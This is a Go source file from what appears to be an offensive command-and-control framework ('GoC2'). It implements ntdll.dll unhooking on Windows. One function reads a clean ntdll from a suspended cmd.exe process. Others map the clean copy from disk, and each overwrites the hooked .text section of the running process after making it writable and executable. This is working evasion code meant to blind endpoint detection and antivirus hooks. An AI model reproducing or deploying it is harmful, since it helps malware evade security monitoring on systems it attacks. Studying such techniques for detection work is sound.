//go:build windows
// +build windows

package unhookntdll

import (
	"bytes"
	"debug/pe"
	"log"
	"syscall"
	"unsafe"

	"github.com/latortuga71/GoC2/pkg/peloader"
	"github.com/latortuga71/GoC2/pkg/rawapi"
	"github.com/latortuga71/GoC2/pkg/winapi"
	"golang.org/x/sys/windows"
)

var SEC_IMAGE uint32 = 0x1000000

func PerunsFart() (string, error) {
	cmdLine, err := windows.UTF16PtrFromString("cmd.exe")
	if err != nil {
		return "", err
	}
	si := windows.StartupInfo{}
	pi := windows.ProcessInformation{}
	err = windows.CreateProcess(nil, cmdLine, nil, nil, false, windows.CREATE_SUSPENDED|windows.CREATE_NEW_CONSOLE, nil, nil, &si, &pi)
	if err != nil {
		return "", err
	}
	ntdllStr, err := windows.UTF16PtrFromString("ntdll.dll")
	if err != nil {
		return "", err
	}
	var ntddlHandle windows.Handle
	err = windows.GetModuleHandleEx(0, ntdllStr, &ntddlHandle)
	if err != nil {
		return "", err
	}
	dosHeader := (*peloader.ImageDOSHeader)(unsafe.Pointer(ntddlHandle))
	imageNtHeader := (*peloader.ImageNtHeader)(unsafe.Pointer(uintptr(ntddlHandle) + uintptr(dosHeader.AddressOfNewEXEHeader)))
	optionalHeader := (*peloader.ImageOptionalHeader64)(unsafe.Pointer(&imageNtHeader.OptionalHeader))
	ntdllSize := optionalHeader.SizeOfImage
	base := make([]byte, ntdllSize)
	var nBytesRead uint32
	err = rawapi.NtReadVirtualMemory(uintptr(pi.Process), uintptr(ntddlHandle), (uintptr)(unsafe.Pointer(&base[0])), ntdllSize, &nBytesRead)
	if err != nil {
		return "", err
	}
	err = windows.TerminateProcess(pi.Process, 0)
	if err != nil {
		return "", err
	}
	buffer := bytes.NewBuffer(base)
	fresh, err := pe.NewFile(bytes.NewReader(buffer.Bytes()))
	if err != nil {
		return "", err
	}
	textSection := fresh.Sections[0]
	offsetToTextSectionHooked := unsafe.Pointer(ntddlHandle + windows.Handle(textSection.VirtualAddress))
	var oldProtect uint32
	var szPtr uintptr = uintptr(textSection.VirtualSize)
	hCurrent, err := windows.GetCurrentProcess()
	if err != nil {
		log.Fatal(err)
	}
	err = rawapi.NtProtectVirtualMemory(uintptr(hCurrent), (uintptr)(offsetToTextSectionHooked), &szPtr, 0x40, &oldProtect)
	if err != nil {
		return "", err
	}
	var nBytesWritten *uint32
	err = rawapi.NtWriteVirtualMemory(uintptr(hCurrent), uintptr(offsetToTextSectionHooked), (uintptr)(unsafe.Pointer(&base[textSection.VirtualAddress])), uintptr(textSection.VirtualSize), nBytesWritten)
	if err != nil {
		return "", err
	}
	err = rawapi.NtProtectVirtualMemory(uintptr(hCurrent), (uintptr)(offsetToTextSectionHooked), &szPtr, oldProtect, &oldProtect)
	if err != nil {
		return "", err
	}
	return "[+] Farted.", nil
}

func UnhookRaw(localNtdllAddress windows.Handle, cleanNtdllMapping uintptr) error {
	pe, err := pe.Open(`C:\\Windows\System32\ntdll.dll`)
	if err != nil {
		return err
	}
	imageSection := pe.Sections[0]
	offsetToTextSectionHooked := unsafe.Pointer(localNtdllAddress + windows.Handle(imageSection.VirtualAddress))
	offsetToTextSectionClean := unsafe.Pointer(cleanNtdllMapping + uintptr(imageSection.VirtualAddress))
	var oldProtect uint32
	var szPtr uintptr = uintptr(imageSection.VirtualSize)
	hCurrent, err := windows.GetCurrentProcess()
	if err != nil {
		log.Fatal(err)
	}
	err = rawapi.NtProtectVirtualMemory(uintptr(hCurrent), (uintptr)(offsetToTextSectionHooked), &szPtr, 0x40, &oldProtect)
	if err != nil {
		return err
	}
	cleanBytes := make([]byte, imageSection.VirtualSize)
	var nBytesWritten *uint32
	var nBytesRead *uint32
	err = rawapi.NtReadVirtualMemory(uintptr(hCurrent), uintptr(offsetToTextSectionClean), (uintptr)(unsafe.Pointer(&cleanBytes[0])), imageSection.VirtualSize, nBytesRead)
	if err != nil {
		return err
	}
	err = rawapi.NtWriteVirtualMemory(uintptr(hCurrent), uintptr(offsetToTextSectionHooked), (uintptr)(unsafe.Pointer(&cleanBytes[0])), uintptr(imageSection.VirtualSize), nBytesWritten)
	if err != nil {
		return err
	}
	err = rawapi.NtProtectVirtualMemory(uintptr(hCurrent), (uintptr)(offsetToTextSectionHooked), &szPtr, oldProtect, &oldProtect)
	if err != nil {
		return err
	}
	return nil
}

func Unhook(localNtdllAddress windows.Handle, cleanNtdllMapping uintptr) error {
	pe, err := pe.Open(`C:\\Windows\System32\ntdll.dll`)
	if err != nil {
		return err
	}
	imageSection := pe.Sections[0]
	offsetToTextSectionHooked := unsafe.Pointer(localNtdllAddress + windows.Handle(imageSection.VirtualAddress))
	offsetToTextSectionClean := unsafe.Pointer(cleanNtdllMapping + uintptr(imageSection.VirtualAddress))
	var oldProtect uint32
	err = windows.VirtualProtect(uintptr(offsetToTextSectionHooked), uintptr(imageSection.VirtualSize), 0x40, &oldProtect)
	if err != nil {
		return err
	}
	hCurrent, err := windows.GetCurrentProcess()
	cleanBytes := make([]byte, imageSection.VirtualSize)
	var nBytesWritten *uint32
	var nBytesRead *uint32
	readMem, err := winapi.ReadProcessMemory(
		syscall.Handle(hCurrent),
		uintptr(offsetToTextSectionClean),
		(uintptr)(unsafe.Pointer(&cleanBytes[0])),
		imageSection.VirtualSize,
		nBytesRead)
	if !readMem {
		return err
	}
	writeMem, err := winapi.WriteProcessMemory(
		syscall.Handle(hCurrent),
		uintptr(offsetToTextSectionHooked),
		(uintptr)(unsafe.Pointer(&cleanBytes[0])),
		imageSection.VirtualSize,
		nBytesWritten)
	if !writeMem {
		return err
	}
	err = windows.VirtualProtect(uintptr(offsetToTextSectionHooked), uintptr(imageSection.VirtualSize), uint32(oldProtect), &oldProtect)
	if err != nil {
		return err
	}
	return nil
}

func UnhookNtdll() (string, error) {
	hFile, err := windows.CreateFile(syscall.StringToUTF16Ptr("C:\\windows\\system32\\ntdll.dll"), windows.GENERIC_READ, windows.FILE_SHARE_READ, nil, windows.OPEN_EXISTING, 0, 0)
	if hFile == 0 {
		return "", err
	}
	sanil := &windows.SecurityAttributes{}
	flags := uint32(windows.PAGE_READONLY | 0x1000000)
	hMap, err := windows.CreateFileMapping(hFile, sanil, flags, 0, 0, nil)
	if hMap == 0 {
		log.Println(syscall.GetLastError())
		windows.CloseHandle(hFile)
		return "", err
	}
	addr, err := windows.MapViewOfFile(hMap, windows.FILE_MAP_READ, 0, 0, 0)
	if err != nil {
		windows.CloseHandle(hFile)
		windows.CloseHandle(hMap)
		return "", err
	}
	if addr == 0 {
		windows.CloseHandle(hFile)
		windows.CloseHandle(hMap)
		return "", err
	}
	var localNtdllAddress windows.Handle
	err = windows.GetModuleHandleEx(0, syscall.StringToUTF16Ptr("ntdll.dll"), &localNtdllAddress)
	if err != nil {
		windows.CloseHandle(hFile)
		windows.CloseHandle(hMap)
		return "", err
	}
	windows.CloseHandle(hMap)
	windows.CloseHandle(hFile)
	err = UnhookRaw(localNtdllAddress, addr)
	if err != nil {
		windows.CloseHandle(localNtdllAddress)
		windows.UnmapViewOfFile(addr)
		return "", err
	}
	err = windows.UnmapViewOfFile(addr)
	if err != nil {
		windows.CloseHandle(localNtdllAddress)
		return "", err
	}
	windows.CloseHandle(localNtdllAddress)
	return "[+] Successfully Unhooked enteedeeellell", nil
}
